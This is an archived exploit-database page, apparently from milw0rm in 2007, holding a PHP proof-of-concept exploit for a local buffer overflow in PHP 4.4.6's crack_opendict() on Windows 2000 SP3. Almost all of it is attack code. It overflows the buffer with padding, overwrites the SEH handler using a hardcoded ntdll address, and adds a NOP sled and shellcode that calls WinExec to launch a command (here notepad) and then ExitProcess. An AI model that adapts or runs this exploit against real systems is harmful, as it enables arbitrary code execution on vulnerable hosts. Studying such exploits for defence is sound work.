<html><head><title>PHP 4.4.6 crack_opendict() Local Buffer Overflow  Exploit PoC</title></head><pre>&lt;?php
//PHP 4.4.6 crack_opendict() local buffer overflow poc exploit
//win2k sp3 version / seh overwrite method
//to be launched from the cli

// by rgod
// site: http://retrogod.altervista.org

if (!extension_loaded(&quot;crack&quot;)){
die(&quot;you need the crack extension loaded.&quot;);
}

$____scode=
&quot;\xeb\x1b&quot;.
&quot;\x5b&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\x31\xc0&quot;.
&quot;\x88\x43\x59&quot;.
&quot;\x53&quot;.
&quot;\xbb\xca\x73\xe9\x77&quot;. //WinExec
&quot;\xff\xd3&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\xbb\x5c\xcf\xe9\x77&quot;. //ExitProcess
&quot;\xff\xd3&quot;.
&quot;\xe8\xe0\xff\xff\xff&quot;.
&quot;\x63\x6d\x64&quot;.
&quot;\x2e&quot;.
&quot;\x65&quot;.
&quot;\x78\x65&quot;.
&quot;\x20\x2f&quot;.
&quot;\x63\x20&quot;.
&quot;start notepad &amp; &quot;;

$jmp=&quot;\xeb\x06\x06\xeb&quot;; // jmp short
$eip=&quot;\x86\xa0\xf8\x77&quot;; // call ebx, ntdll.dll
$____suntzu.=str_repeat(&quot;A&quot;,3216);
$____suntzu.=$jmp.$eip.str_repeat(&quot;\x90&quot;,12).$____scode;
crack_opendict($____suntzu);

?&gt;

# milw0rm.com [2007-03-08]</pre></html>